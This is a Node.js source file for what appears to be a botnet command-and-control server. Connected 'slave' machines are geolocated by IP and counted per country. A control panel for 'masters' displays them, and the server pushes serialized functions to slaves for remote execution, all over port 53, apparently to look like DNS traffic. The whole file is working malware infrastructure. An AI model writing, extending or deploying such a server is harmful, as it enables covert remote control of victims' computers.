let express = require('express');
let app = express();
let path = require('path');
let http = require('http').Server(app);
let io = require('socket.io')(http);
let request = require('request');

const debug = true;

let Module = require('./Module.js');
let Modules = require('./Modules.js');
let ver = require('./../../version.js');

let slaveCount = 0;
let slaveSockets = [];
let slaveGeo = {};
let slaveCountries = [];

let control_panel_html_path = path.join(__dirname, 'control_panel');

app.set('view engine', 'pug')
app.set('views', control_panel_html_path);
app.use(express.static(control_panel_html_path));

app.get('/', function(req, res) {
	res.render('index', { version: ver })
});

app.get('/clients', function(req, res) {
	res.render('clients')
});

app.get('/modules', function(req, res) {
	let onConnectModules = [];

	Modules.getAllModules().forEach(function(arg) {
		onConnectModules.push(arg.name);
	});

	res.render('modules', {onConnectModules: onConnectModules})
});

io.on('connection', function(socket) {
	let ip = (socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress).address || "localhost";
			
	socket.debugExecFunc = debug;
	socket.executeFunc = function(module, funcName, args, callback) {
		let finalObj = {};
		
		finalObj.func = module.remoteFunctions[funcName].toString();
		finalObj.args = args;
		finalObj.deps = module.deps
		
		this.emit("executeRemoteFunction", finalObj, this.debugExecFunc, funcName);
		
		this.on(funcName+"Out", function(out) {
			if (callback != null) callback(out);
		});
	}	
	
	socket.on('disconnect', function() {
		if (socket.mode == "slave" && slaveSockets.indexOf(socket) != -1) {
			slaveCount--;
			slaveSockets.pop(socket);

			slaveGeo[socket.country].pop(socket);

			if (slaveGeo[socket.country].length == 0)
				slaveCountries.pop(socket.country);
				
			console.log('slave disconnected');
		} else {
			console.log('master disconnected');
		}
	});
	
	socket.emit("connection");
	
	socket.on('postConnection', function(mode) {
		if (mode == "slave") {
				slaveCount++;
				slaveSockets.push(socket);
								
				request('http://www.geoplugin.net/json.gp?ip='+ip, function (error, response, body) {
					json = JSON.parse(body);

					if (slaveGeo[json["geoplugin_countryName"]] == null) slaveGeo[json["geoplugin_countryName"]] = [];
					slaveGeo[json["geoplugin_countryName"]].push(ip);

					socket.country = json["geoplugin_countryName"];

					if (slaveCountries.indexOf(socket.country) == -1) slaveCountries.push(socket.country);
				});
				console.log('new slave connection from: '+ ip);
		} else {
			socket.on('updateClientData', function() {
				
				let data = []
				
				for (let i = 0; i < slaveCountries.length; i++) {
					data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length]
				}
				
				socket.emit('getClientsData', data, slaveGeo);
			});
			console.log('new master connection from: '+ ip);
		}
		socket.mode = mode;
	});
	
});

http.listen(53, function() {
	console.log('listening on *:53');
	console.log('Control panel: http://localhost:53/')
});